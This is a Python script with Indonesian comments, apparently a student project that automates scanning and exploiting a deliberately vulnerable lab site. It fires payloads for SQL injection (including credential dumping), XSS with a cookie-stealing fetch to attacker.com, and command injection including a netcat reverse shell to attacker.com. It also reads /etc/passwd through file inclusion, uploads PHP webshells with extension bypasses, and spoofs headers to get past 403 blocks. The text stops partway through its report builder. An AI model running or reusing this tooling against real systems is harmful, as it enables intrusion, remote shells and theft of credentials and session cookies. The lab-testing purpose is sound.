#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
PROYEK AKHIR : OTOMATISASI VULNERABILITY ASSESSMENT & PENETRATION TESTING (WEB ONLY)
Fitur Agresif:
- Bypass 403 dengan berbagai header dan metode HTTP
- Fuzzing path untuk menemukan endpoint tersembunyi
- Payload eksploitasi modern (encoding ganda, komentar bersarang, dll.)
- Deteksi kerentanan berbasis heuristik (time-based, boolean blind, error)
- Laporan HTML komprehensif
- Menu interaktif 5 mode
"""

import os
import sys
import subprocess
import json
import time
import re
import urllib.parse
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== KONFIGURASI ====================
ARACHNI_BASE = os.path.expanduser("~/Downloads/arachni-1.6.1.3-0.6.1.1")
ARACHNI_PATH = f"{ARACHNI_BASE}/bin/arachni"
ARACHNI_REPORTER = f"{ARACHNI_BASE}/bin/arachni_reporter"
BASE_URL = "http://vulnweb.rootbrain.com"
DIR_LAPORAN = "laporan_akhir_web"
DIR_WEB = f"{DIR_LAPORAN}/web"
LOG_EKSPLOIT = f"{DIR_LAPORAN}/log_eksploitasi.txt"
REPORT_HTML = f"{DIR_LAPORAN}/laporan.html"

# Daftar URL target (sesuai daftar)
URL_LIST = [
    "http://vulnweb.rootbrain.com/",
    "http://vulnweb.rootbrain.com/CommandExecution/commandexec.html",
    "http://vulnweb.rootbrain.com/CommandExecution/CommandExec-1.php",
    "http://vulnweb.rootbrain.com/CommandExecution/CommandExec-1.php?username=Admin&password=",
    "http://vulnweb.rootbrain.com/CommandExecution/CommandExec-2.php",
    "http://vulnweb.rootbrain.com/CommandExecution/CommandExec-2.php?typeBox=",
    "http://vulnweb.rootbrain.com/CommandExecution/CommandExec-3.php",
    "http://vulnweb.rootbrain.com/CommandExecution/CommandExec-3.php?typeBox=",
    "http://vulnweb.rootbrain.com/CommandExecution/CommandExec-4.php",
    "http://vulnweb.rootbrain.com/CommandExecution/CommandExec-4.php?typeBox=",
    "http://vulnweb.rootbrain.com/SQL/sqlmainpage.html",
    "http://vulnweb.rootbrain.com/SQL/sql1.php",
    "http://vulnweb.rootbrain.com/SQL/sql1.php/",
    "http://vulnweb.rootbrain.com/SQL/sql2.php",
    "http://vulnweb.rootbrain.com/SQL/sql2.php/",
    "http://vulnweb.rootbrain.com/SQL/sql3.php",
    "http://vulnweb.rootbrain.com/SQL/sql3.php/",
    "http://vulnweb.rootbrain.com/SQL/sql4.php",
    "http://vulnweb.rootbrain.com/SQL/sql4.php/",
    "http://vulnweb.rootbrain.com/SQL/sql5.php/",
    "http://vulnweb.rootbrain.com/SQL/sql6.php",
    "http://vulnweb.rootbrain.com/SQL/sql6.php/",
    "http://vulnweb.rootbrain.com/SQL/sql6.php?number=",
    "http://vulnweb.rootbrain.com/XSS/xssmainpage.html",
    "http://vulnweb.rootbrain.com/XSS/xssmainpage.html/",
    "http://vulnweb.rootbrain.com/XSS/XSS_level1.php",
    "http://vulnweb.rootbrain.com/XSS/XSS_level1.php?username=",
    "http://vulnweb.rootbrain.com/XSS/XSS_level2.php",
    "http://vulnweb.rootbrain.com/XSS/XSS_level2.php?username=%",
    "http://vulnweb.rootbrain.com/XSS/XSS_level3.php",
    "http://vulnweb.rootbrain.com/XSS/XSS_level3.php?username=",
    "http://vulnweb.rootbrain.com/XSS/XSS_level4.php",
    "http://vulnweb.rootbrain.com/XSS/XSS_level4.php?username=",
    "http://vulnweb.rootbrain.com/XSS/XSS_level5.php",
    "http://vulnweb.rootbrain.com/FileInclusion/pages/fileinc.html",
    "http://vulnweb.rootbrain.com/FileInclusion/pages/lvl1.php",
    "http://vulnweb.rootbrain.com/FileInclusion/pages/lvl1.php?file=",
    "http://vulnweb.rootbrain.com/FileInclusion/pages/lvl2.php?file=",
    "http://vulnweb.rootbrain.com/FileInclusion/pages/lvl2.php",
    "http://vulnweb.rootbrain.com/FileInclusion/pages/lvl3.php?file=",
    "http://vulnweb.rootbrain.com/FileInclusion/pages/lvl3.php",
    "http://vulnweb.rootbrain.com/FileInclusion/pages/lvl4.php?file=",
    "http://vulnweb.rootbrain.com/FileInclusion/pages/lvl4.php",
    "http://vulnweb.rootbrain.com/FileUpload/fileupl.html",
    "http://vulnweb.rootbrain.com/FileUpload/fileupload1.php",
    "http://vulnweb.rootbrain.com/FileUpload/fileupload2.php",
    "http://vulnweb.rootbrain.com/FileUpload/fileupload3.php",
    "http://vulnweb.rootbrain.com/FileUpload/fileupl.html/",
    "http://vulnweb.rootbrain.com/FileUpload/fileupload1.php/",
    "http://vulnweb.rootbrain.com/FileUpload/fileupload2.php/",
    "http://vulnweb.rootbrain.com/FileUpload/fileupload3.php/",
]

MAX_WORKERS = 5
TIME_THRESHOLD = 5  # detik untuk time-based

os.makedirs(DIR_WEB, exist_ok=True)

# ==================== FUNGSI BANTU ====================
def jalankan_perintah(perintah: str, tangkap: bool = True, timeout: int = 300) -> subprocess.CompletedProcess:
    print(f"[CMD] {perintah}")
    try:
        hasil = subprocess.run(
            perintah,
            shell=True,
            capture_output=tangkap,
            text=True,
            timeout=timeout
        )
        if tangkap and hasil.stdout:
            pratinjau = hasil.stdout[:200] + "..." if len(hasil.stdout) > 200 else hasil.stdout
            print(f"[OUT] {pratinjau}")
        return hasil
    except subprocess.TimeoutExpired:
        print(f"[ERROR] Perintah timeout setelah {timeout}s: {perintah}")
        return subprocess.CompletedProcess(args=perintah, returncode=124, stdout="", stderr="Timeout")
    except Exception as e:
        print(f"[ERROR] Gagal menjalankan perintah: {e}")
        return subprocess.CompletedProcess(args=perintah, returncode=1, stdout="", stderr=str(e))

def catat_log(pesan: str, level: str = "INFO") -> None:
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] [{level}] {pesan}")
    with open(f"{DIR_LAPORAN}/eksekusi.log", "a") as f:
        f.write(f"[{timestamp}] [{level}] {pesan}\n")

def catat_eksploit(pesan: str) -> None:
    with open(LOG_EKSPLOIT, "a") as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {pesan}\n")

# ==================== HTTP REQUEST HANDLER ====================
def http_request(url: str, method: str = "GET", headers: Dict = None, data: str = "", timeout: int = 15) -> Tuple[Optional[int], str, float]:
    """
    Mengirim HTTP request menggunakan curl.
    Mengembalikan (status_code, body, elapsed_time).
    """
    cmd = f"curl -k -s -L --max-time {timeout} -w '%{{http_code}}' -X {method} "
    if headers:
        for k, v in headers.items():
            cmd += f"-H '{k}: {v}' "
    if data:
        cmd += f"-d '{data}' "
    cmd += f"'{url}'"
    start = time.time()
    hasil = jalankan_perintah(cmd, timeout=timeout+2)
    elapsed = time.time() - start
    if hasil.returncode != 0:
        return None, "", elapsed
    # Pisahkan body (semua kecuali 3 digit terakhir) dan status code
    if len(hasil.stdout) < 3:
        return None, hasil.stdout, elapsed
    body = hasil.stdout[:-3]
    status_str = hasil.stdout[-3:]
    try:
        status = int(status_str)
    except:
        status = None
    return status, body, elapsed

def get_status_code(url: str, method: str = "GET", headers: Dict = None, timeout: int = 10) -> Optional[str]:
    """Hanya mengembalikan status code."""
    cmd = f"curl -k -s -o /dev/null -w '%{{http_code}}' --max-time {timeout} -X {method} "
    if headers:
        for k, v in headers.items():
            cmd += f"-H '{k}: {v}' "
    cmd += f"'{url}'"
    hasil = jalankan_perintah(cmd, timeout=timeout+2)
    if hasil.returncode == 0:
        return hasil.stdout.strip()
    return None

# ==================== BYPASS 403 ====================
def try_bypass_403(url: str, timeout: int = 10) -> Tuple[Optional[str], Optional[Dict]]:
    """Mencoba berbagai teknik bypass 403, mengembalikan (method, headers) jika berhasil."""
    headers_list = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-For": "8.8.8.8"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Forwarded-Server": "localhost"},
        {"X-Host": "localhost"},
        {"X-Original-URL": "/"},
        {"X-Rewrite-URL": "/"},
        {"Referer": "https://www.google.com/"},
        {"User-Agent": "Googlebot"},
        {"Accept": "*/*"},
    ]
    methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD", "TRACE"]
    for m in methods:
        for headers in headers_list:
            status = get_status_code(url, method=m, headers=headers, timeout=timeout)
            if status == "200":
                catat_eksploit(f"[Bypass 403] Berhasil dengan method {m} dan headers {headers}")
                return m, headers
    return None, None

# ==================== FUZZING PATH ====================
def fuzz_paths(domain: str, timeout: int = 10) -> List[str]:
    """Mencari endpoint tersembunyi dengan berbagai variasi path."""
    paths = [
        "/%2e/", "/%252e/", "/..;/", "/.../", "/./", "/.//", "//", "/;", "/.",
        "/admin", "/administrator", "/backup", "/config", "/db", "/phpmyadmin",
        "/.git", "/.env", "/.svn", "/.DS_Store", "/.htaccess", "/.htpasswd",
        "/api", "/v1", "/v2", "/rest", "/soap", "/xml", "/json",
        "/test", "/dev", "/temp", "/tmp", "/logs", "/data", "/uploads", "/images",
        "index.php", "index", "index.html", "index.asp", "index.aspx",
    ]
    found = []
    for p in paths:
        test_url = domain + p
        status = get_status_code(test_url, timeout=timeout)
        if status == "200":
            catat_eksploit(f"[Fuzzing] Ditemukan: {test_url} (200 OK)")
            found.append(test_url)
        elif status == "403":
            # Coba bypass
            method, headers = try_bypass_403(test_url, timeout=timeout)
            if method:
                catat_eksploit(f"[Fuzzing] Bypass 403 pada {test_url} dengan {method}")
                found.append(test_url)
    return found

# ==================== ARACHNI INTEGRATION ====================
def periksa_arachni() -> bool:
    if not os.path.exists(ARACHNI_PATH):
        catat_log(f"Arachni tidak ditemukan di {ARACHNI_PATH}!", "ERROR")
        return False
    hasil = jalankan_perintah(f"{ARACHNI_PATH} --version")
    if hasil.returncode != 0:
        catat_log("Eksekusi Arachni gagal.", "ERROR")
        return False
    catat_log(f"Arachni ditemukan: {hasil.stdout.strip()}")
    return True

def buat_file_restrict_paths() -> str:
    file_path = f"{DIR_WEB}/restrict_paths.txt"
    # Hanya tulis path yang unik
    paths = set()
    for url in URL_LIST:
        if url.startswith(BASE_URL):
            path = url[len(BASE_URL):]
            if not path.startswith('/'):
                path = '/' + path
            paths.add(path)
    with open(file_path, 'w') as f:
        for path in sorted(paths):
            f.write(path + '\n')
    catat_log(f"File restrict paths dibuat dengan {len(paths)} entri: {file_path}")
    return file_path

def jalankan_scan_arachni() -> Optional[str]:
    catat_log("Memulai scan web dengan Arachni...")
    file_afr = f"{DIR_WEB}/scan.afr"
    file_json = f"{DIR_WEB}/laporan.json"
    file_html_zip = f"{DIR_WEB}/laporan.html.zip"
    restrict_file = buat_file_restrict_paths()

    if os.path.exists(file_json):
        catat_log("Hasil scan sudah ada, melewati proses scan.")
        return file_json

    # Perintah Arachni (tanpa pengecekan base URL)
    perintah = (
        f"{ARACHNI_PATH} "
        f"--output-verbose "
        f"--scope-restrict-paths {restrict_file} "
        f"--audit-links --audit-forms --audit-cookies --audit-headers "
        f"--audit-parameter-names --audit-with-extra-parameter "
        f"--audit-with-both-methods "
        f"--http-request-concurrency 20 "
        f"--checks=* "
        f"--browser-cluster-wait-for-timers "
        f"--browser-cluster-pool-size 4 "
        f"--report-save-path {file_afr} "
        f"--timeout 02:00:00 "
        f"--http-user-agent='Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' "
        f"--http-request-header='X-Forwarded-For: 127.0.0.1' "
        f"{BASE_URL}"
    )

    # def test_url(url, ip, wfuzz_filter, bypass):
    #     proxy = ""  # Jika menggunakan proxy, metode HTTP POST dan PUT dapat membuat program macet, jadi jangan gunakan proxy sampai ini diperbaiki!
    # 
    #     users = "admin-administrator-root-anonymous-ftp-guest-superadmin-tomcat-user-test-public-mysql"
    #     passwords = "admin-administrator-password-123456-12345678-root-toor-qwerty-anonymous-True"
    #     useragents = [ "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    #                    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
    #                    "Mozilla/5.0 (Linux; U; Android 4.4.2; es-es; SM-T210R Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
    #                    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4",
    #                    "Mozilla/5.0 (Linux; Android 9; SM-G960F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36",
    #                    "Googlebot", "Bingbot", "admin" ]

    catat_log("Menjalankan perintah Arachni (ini bisa memakan waktu hingga 1 jam)...")
    hasil = jalankan_perintah(perintah, tangkap=False, timeout=3600)
    if hasil.returncode != 0:
        catat_log(f"Scan Arachni gagal dengan kode {hasil.returncode}.", "ERROR")
        # Coba baca log error dari file jika ada
        error_log = os.path.expanduser("~/Downloads/arachni-1.6.1.3-0.6.1.1/logs/framework/error-*.log")
        catat_log(f"Periksa log error di {error_log} untuk detail.", "ERROR")
        return None

    catat_log("Mengonversi laporan ke JSON dan HTML...")
    jalankan_perintah(f"{ARACHNI_REPORTER} {file_afr} --reporter=json:outfile={file_json}", tangkap=True)
    jalankan_perintah(f"{ARACHNI_REPORTER} {file_afr} --reporter=html:outfile={file_html_zip}", tangkap=True)
    catat_log(f"Scan selesai. Laporan tersimpan di {DIR_WEB}")
    return file_json

def ekstrak_semua_isu(file_json: str) -> List[Dict]:
    try:
        with open(file_json, 'r', encoding='utf-8') as f:
            data = json.load(f)
    except Exception as e:
        catat_log(f"Gagal membaca JSON: {e}", "ERROR")
        return []
    return data.get('issues', [])

def ekstrak_kerentanan_tinggi(file_json: str) -> List[Dict]:
    isu = ekstrak_semua_isu(file_json)
    hasil = []
    for i in isu:
        severity = i.get('severity', '').upper()
        if severity in ['HIGH', 'CRITICAL']:
            hasil.append({
                'nama': i.get('name'),
                'url': i.get('url'),
                'parameter': i.get('parameter', ''),
                'severity': severity,
                'deskripsi': i.get('description', ''),
                'cwe': i.get('cwe', ''),
            })
    catat_log(f"Ditemukan {len(hasil)} kerentanan High/Critical dari Arachni.")
    return hasil

# ==================== EKSPLOITASI DENGAN BYPASS ====================
def eksploit_sqli(url: str, param: str, method: str = "GET", headers: Dict = None) -> Optional[Dict]:
    """SQL injection dengan payload agresif."""
    payloads = [
        # Union-based
        ("1' UNION SELECT NULL, version(), NULL--", "union_version"),
        ("1' UNION SELECT NULL, table_name, NULL FROM information_schema.tables--", "union_tables"),
        ("1' UNION SELECT NULL, concat(username,':',password), NULL FROM users--", "union_creds"),
        # Bypass encoding
        ("1%27%20UNION%20SELECT%20NULL%2C%20version()%2C%20NULL--", "union_encoded"),
        ("1%2527%2520UNION%2520SELECT%2520NULL%252C%2520version()%252C%2520NULL--", "union_double_encoded"),
        # Komentar inline
        ("1'/*!UNION*/ SELECT NULL, version(), NULL--", "union_comment"),
        ("1'/*!50000UNION*/ SELECT NULL, version(), NULL--", "union_mysql_comment"),
        # Error-based
        ("1' AND extractvalue(1, concat(0x7e, database()))--", "error_extractvalue"),
        ("1' AND updatexml(1, concat(0x7e, database()), 1)--", "error_updatexml"),
        # Boolean blind
        ("1' AND '1'='1", "boolean_true"),
        ("1' AND '1'='2", "boolean_false"),
        # Time-based
        ("1' AND SLEEP(5)--", "time_sleep"),
        ("1' AND BENCHMARK(5000000, MD5('test'))--", "time_benchmark"),
        ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "time_subselect"),
        # Case variation
        ("1' UnIoN SeLeCt NULL, version(), NULL--", "union_case"),
        ("1' UNION SELECT NULL, version(), NULL /*", "union_comment_end"),
    ]
    # Ambil baseline untuk boolean blind
    normal_url = f"{url}?{param}=1"
    _, normal_body, normal_time = http_request(normal_url, method=method, headers=headers, timeout=10)
    normal_len = len(normal_body)

    for payload, teknik in payloads:
        full_url = f"{url}?{param}={payload}"
        status, body, elapsed = http_request(full_url, method=method, headers=headers, timeout=20)
        if status != 200:
            continue

        # Deteksi union/error
        if "mysql" in body.lower() or "version" in body.lower():
            catat_eksploit(f"[SQLi] {teknik} berhasil (union) di {full_url}")
            return {
                'url': full_url,
                'payload': payload,
                'teknik': teknik,
                'data': body[:500],
                'bypass': 'union/error'
            }
        if "XPATH" in body or "SQL syntax" in body:
            catat_eksploit(f"[SQLi] {teknik} berhasil (error) di {full_url}")
            return {
                'url': full_url,
                'payload': payload,
                'teknik': teknik,
                'data': body[:500],
                'bypass': 'error'
            }

        # Boolean blind: bandingkan panjang
        if teknik == "boolean_true":
            true_len = len(body)
            # Uji false
            false_url = f"{url}?{param}=1' AND '1'='2--"
            _, false_body, _ = http_request(false_url, method=method, headers=headers, timeout=10)
            if abs(len(false_body) - true_len) > 50:
                catat_eksploit(f"[SQLi] boolean blind terdeteksi di {full_url}")
                return {
                    'url': full_url,
                    'payload': payload,
                    'teknik': 'boolean_blind',
                    'data': f"True length: {true_len}, False length: {len(false_body)}",
                    'bypass': 'boolean'
                }

        # Time-based
        if teknik.startswith("time") and elapsed > TIME_THRESHOLD:
            catat_eksploit(f"[SQLi] time-based terdeteksi ({elapsed:.2f}s) di {full_url}")
            return {
                'url': full_url,
                'payload': payload,
                'teknik': teknik,
                'data': f"Delay {elapsed:.2f}s",
                'bypass': 'time'
            }
    return None

def eksploit_xss(url: str, param: str, method: str = "GET", headers: Dict = None) -> Optional[Dict]:
    """XSS dengan payload polyglot."""
    payloads = [
        ("<script>alert('XSS')</script>", "script_basic"),
        ("<img src=x onerror=alert('XSS')>", "img_onerror"),
        ("\"><script>alert('XSS')</script>", "break_out"),
        ("<svg/onload=alert('XSS')>", "svg_onload"),
        ("<iframe src=\"javascript:alert('XSS')\">", "iframe_js"),
        ("<input type=\"text\" onfocus=\"alert('XSS')\" autofocus>", "input_onfocus"),
        ("<math><mtext><a xlink:href=\"javascript:alert('XSS')\">click</a></mtext></math>", "math_xlink"),
        ("&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;", "html_encoded"),
        ("%253Cscript%253Ealert('XSS')%253C/script%253E", "double_encoded"),
        ("\"'><img src=x onerror=alert('XSS')>", "polyglot_img"),
        ("<details open ontoggle=alert('XSS')>", "details_ontoggle"),
        ("<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>", "stored_cookie"),
    ]
    for payload, teknik in payloads:
        full_url = f"{url}?{param}={payload}"
        status, body, _ = http_request(full_url, method=method, headers=headers, timeout=10)
        if status != 200:
            continue
        if payload in body or "alert('XSS')" in body or "onerror=alert" in body:
            catat_eksploit(f"[XSS] {teknik} berhasil di {full_url}")
            return {
                'url': full_url,
                'payload': payload,
                'teknik': teknik,
                'data': "Payload reflected",
                'bypass': 'polyglot/encoding'
            }
    return None

def eksploit_command_injection(url: str, param: str, method: str = "GET", headers: Dict = None) -> Optional[Dict]:
    """Command injection dengan berbagai pemisah."""
    payloads = [
        ("; id", "semicolon"),
        ("| id", "pipe"),
        ("$(id)", "subshell"),
        ("`id`", "backtick"),
        ("%3B id", "url_encoded_semicolon"),
        ("%0A id", "newline"),
        ("& id", "ampersand"),
        ("&& id", "and"),
        ("|| id", "or"),
        ("\nid", "newline_char"),
        (";`id`", "combined"),
        ("; nc -e /bin/sh attacker.com 4444", "reverse_shell"),
    ]
    for payload, teknik in payloads:
        full_url = f"{url}?{param}={payload}"
        status, body, _ = http_request(full_url, method=method, headers=headers, timeout=10)
        if status != 200:
            continue
        if "uid=" in body or "gid=" in body:
            catat_eksploit(f"[CMDi] {teknik} berhasil di {full_url}")
            return {
                'url': full_url,
                'payload': payload,
                'teknik': teknik,
                'data': body[:500],
                'bypass': 'encoding'
            }
    return None

def eksploit_lfi(url: str, param: str, method: str = "GET", headers: Dict = None) -> Optional[Dict]:
    """LFI dengan traversal dan wrapper."""
    payloads = [
        ("../../../../../../etc/passwd", "basic_traversal"),
        ("..\\..\\..\\..\\..\\windows\\win.ini", "windows_traversal"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "double_encoded"),
        ("%252e%252e%252f%252e%252e%252fetc%252fpasswd", "triple_encoded"),
        ("....//....//....//....//etc/passwd", "nested_dots"),
        ("php://filter/convert.base64-encode/resource=index.php", "php_wrapper"),
        ("php://filter/read=string.rot13/resource=index.php", "php_rot13"),
        ("../../../../../../etc/passwd%00", "null_byte"),
        ("/var/log/apache2/access.log", "log_poison"),
        ("/proc/self/environ", "proc_environ"),
    ]
    for payload, teknik in payloads:
        full_url = f"{url}?{param}={payload}"
        status, body, _ = http_request(full_url, method=method, headers=headers, timeout=10)
        if status != 200:
            continue
        if "root:x:0:0" in body:
            catat_eksploit(f"[LFI] {teknik} berhasil (etc/passwd) di {full_url}")
            return {
                'url': full_url,
                'payload': payload,
                'teknik': teknik,
                'data': body[:500],
                'bypass': 'traversal'
            }
        if "[fonts]" in body:
            catat_eksploit(f"[LFI] {teknik} berhasil (win.ini) di {full_url}")
            return {
                'url': full_url,
                'payload': payload,
                'teknik': teknik,
                'data': body[:500],
                'bypass': 'windows'
            }
        if re.match(r'^[A-Za-z0-9+/]+=*$', body.strip()):
            catat_eksploit(f"[LFI] {teknik} berhasil (base64) di {full_url}")
            return {
                'url': full_url,
                'payload': payload,
                'teknik': teknik,
                'data': body[:200],
                'bypass': 'php wrapper'
            }
    return None

def eksploit_upload(url: str, method: str = "GET", headers: Dict = None) -> Optional[Dict]:
    """File upload dengan bypass ekstensi."""
    # Dapatkan halaman upload
    status, body, _ = http_request(url, method=method, headers=headers, timeout=10)
    if status != 200:
        return None
    if 'enctype="multipart/form-data"' not in body and 'type="file"' not in body:
        return None

    catat_eksploit(f"[Upload] Formulir upload terdeteksi di {url}, mencoba bypass...")

    # Deteksi field name
    field_match = re.search(r'name="([^"]+)"\s+type="file"', body)
    if not field_match:
        return {
            'url': url,
            'teknik': 'deteksi',
            'data': 'Tidak dapat menentukan field name.',
            'bypass': 'N/A'
        }
    field = field_match.group(1)

    # Deteksi action
    action_match = re.search(r'action="([^"]+)"', body)
    if action_match:
        action = action_match.group(1)
        if not action.startswith("http"):
            action = urllib.parse.urljoin(url, action)
    else:
        action = url

    filenames = [
        "shell.php",
        "shell.php.jpg",
        "shell.php;.jpg",
        "shell.php%00.jpg",
        "shell.phtml",
        "shell.php3",
        "shell.php4",
        "shell.php5",
        "shell.php.gif",
    ]
    shells = [
        "<?php echo system($_GET['cmd']); ?>",
        "<?php passthru($_GET['cmd']); ?>",
        "GIF89a<?php system($_GET['cmd']); ?>",
    ]

    for fname in filenames:
        for shell in shells:
            with open("/tmp/temp_shell", "w") as f:
                f.write(shell)
            # Build curl command with potential headers
            cmd = f"curl -k -s -X POST "
            if headers:
                for k, v in headers.items():
                    cmd += f"-H '{k}: {v}' "
            cmd += f"-F '{field}=@/tmp/temp_shell;filename={fname}' '{action}'"
            res = jalankan_perintah(cmd, timeout=20)
            if res.returncode == 0:
                # Coba akses shell
                base_path = url.rstrip('/').rsplit('/', 1)[0]
                shell_url = f"{base_path}/uploads/{fname}?cmd=id"
                status2, body2, _ = http_request(shell_url, timeout=10)
                if "uid=" in body2:
                    catat_eksploit(f"[Upload] Webshell berhasil: {shell_url}")
                    return {
                        'url': url,
                        'teknik': 'upload_webshell',
                        'data': f"Webshell di {shell_url}",
                        'bypass': 'ekstensi ganda'
                    }
    return None

def lakukan_eksploitasi(daftar_kerentanan: List[Dict]) -> List[Dict]:
    """Eksploitasi berdasarkan hasil Arachni."""
    hasil = []
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        for v in daftar_kerentanan:
            nama = v['nama'].lower()
            url = v['url']
            param = v.get('parameter', '')
            if 'sql' in nama:
                futures.append(executor.submit(eksploit_sqli, url, param))
            elif 'xss' in nama:
                futures.append(executor.submit(eksploit_xss, url, param))
            elif 'command' in nama or 'exec' in nama:
                futures.append(executor.submit(eksploit_command_injection, url, param))
            elif 'file inclusion' in nama or 'lfi' in nama:
                futures.append(executor.submit(eksploit_lfi, url, param))
            elif 'upload' in nama:
                futures.append(executor.submit(eksploit_upload, url))
        for future in as_completed(futures):
            try:
                res = future.result()
                if res:
                    hasil.append(res)
            except Exception as e:
                catat_log(f"Eksploitasi error: {e}", "ERROR")
    return hasil

# ==================== PROSES SATU URL (UNTUK MANUAL) ====================
def process_single_url(url: str, use_bypass: bool = True) -> List[Dict]:
    """Memproses satu URL: coba bypass, lalu eksploitasi semua parameter."""
    hasil = []
    parsed = urllib.parse.urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params = urllib.parse.parse_qs(parsed.query)

    # Coba bypass pada base URL
    method = "GET"
    headers = None
    if use_bypass:
        m, h = try_bypass_403(base)
        if m:
            method = m
            headers = h

    if not params:
        # Tidak ada parameter, coba upload
        if 'upload' in base.lower():
            res = eksploit_upload(base, method=method, headers=headers)
            if res:
                hasil.append(res)
        return hasil

    # Untuk setiap parameter, coba semua jenis eksploitasi
    for param in params.keys():
        # Urutan: SQLi -> XSS -> CMDi -> LFI
        res = eksploit_sqli(base, param, method=method, headers=headers)
        if res:
            hasil.append(res)
            continue
        res = eksploit_xss(base, param, method=method, headers=headers)
        if res:
            hasil.append(res)
            continue
        res = eksploit_command_injection(base, param, method=method, headers=headers)
        if res:
            hasil.append(res)
            continue
        res = eksploit_lfi(base, param, method=method, headers=headers)
        if res:
            hasil.append(res)
            continue
    return hasil

def manual_exploit_all_urls(use_bypass: bool = True) -> List[Dict]:
    """Eksploitasi manual pada semua URL dalam daftar."""
    catat_log("Menjalankan eksploitasi manual pada semua URL...")
    hasil = []
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        future_to_url = {executor.submit(process_single_url, url, use_bypass): url for url in URL_LIST}
        for future in as_completed(future_to_url):
            try:
                res = future.result()
                if res:
                    hasil.extend(res)
            except Exception as e:
                catat_log(f"Error: {e}", "ERROR")
    catat_log(f"Eksploitasi manual selesai. {len(hasil)} temuan.")
    return hasil

# ==================== LAPORAN HTML ====================
def buat_laporan(semua_isu: List[Dict], web_vulns: List[Dict], hasil_eksploit: List[Dict]) -> None:
    """Membuat laporan HTML dengan tabel dan rekomendasi."""

    # Statistik
    web_crit = sum(1 for v in web_vulns if v['severity'] == 'CRITICAL')
    web_high = sum(1 for v in web_vulns if v['severity'] == 'HIGH')
    web_medium = sum(1 for v in web_vulns if v['severity'] == 'MEDIUM')
    web_low = sum(1 for v in web_vulns if v['severity'] == 'LOW')
    total_web = len(web_vulns)

    # Statistik semua isu
    total_isu = len(semua_isu)
    sev_count = {}
    for i in semua_isu:
        sev = i.get('severity', 'informational').upper()
        sev_count[sev] = sev_count.get(sev, 0) + 1

    # Buat HTML
    html = f"""<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Laporan Vulnerability Assessment (Web Only)</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
        h1, h2, h3 {{ color: #333; }}
        table {{ border-collapse: collapse; width: 100%; margin-bottom: 20px; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #4CAF50; color: white; }}
        .severity-critical, .severity-high {{ background-color: #ffcccc; }}
        .severity-medium {{ background-color: #ffff99; }}
        .severity-low {{ background-color: #e6f2ff; }}
        .severity-informational {{ background-color: #d3d3d3; }}
        .summary-box {{ display: flex; justify-content: space-around; margin: 20px 0; }}
        .box {{ background-color: #2196F3; color: white; padding: 20px; border-radius: 5px; width: 30%; text-align: center; }}
        .box.web {{ background-color: #4CAF50; }}
        .box.exploit {{ background-color: #ff9800; }}
        .footer {{ margin-top: 30px; font-size: 0.9em; color: #777; text-align: center; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>LAPORAN PENILAIAN KERENTANAN WEB</h1>
        <p><strong>Tanggal:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p><strong>URL Target Web:</strong> {BASE_URL}</p>

        <div class="summary-box">
            <div class="box web">Kerentanan Web (High/Critical): {total_web}</div>
            <div class="box exploit">Eksploitasi Berhasil: {len(hasil_eksploit)}</div>
        </div>

        <h2>KEAMANAN APLIKASI WEB</h2>
        <h3>Ringkasan Severity (Semua Temuan)</h3>
        <ul>
"""
    for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFORMATIONAL']:
        count = sev_count.get(sev, 0)
        html += f"<li>{sev}: {count}</li>\n"
    html += f"</ul><p>Total semua isu: {total_isu}</p>"

    html += """
        <h3>Semua Temuan Web</h3>
        <table>
            <tr><th>#</th><th>Nama Kerentanan</th><th>URL</th><th>Parameter</th><th>Severity</th><th>CWE</th></tr>
"""
    for idx, i in enumerate(semua_isu, 1):
        sev = i.get('severity', 'informational').lower()
        html += f"<tr class='severity-{sev}'><td>{idx}</td><td>{i.get('name','')}</td><td>{i.get('url','')}</td><td>{i.get('parameter','N/A')}</td><td>{i.get('severity','informational')}</td><td>{i.get('cwe','N/A')}</td></tr>"
    html += "</table>"

    html += """
        <h3>Daftar Kerentanan High/Critical</h3>
        <table>
            <tr><th>#</th><th>Nama Kerentanan</th><th>URL</th><th>Parameter</th><th>Severity</th><th>CWE</th></tr>
"""
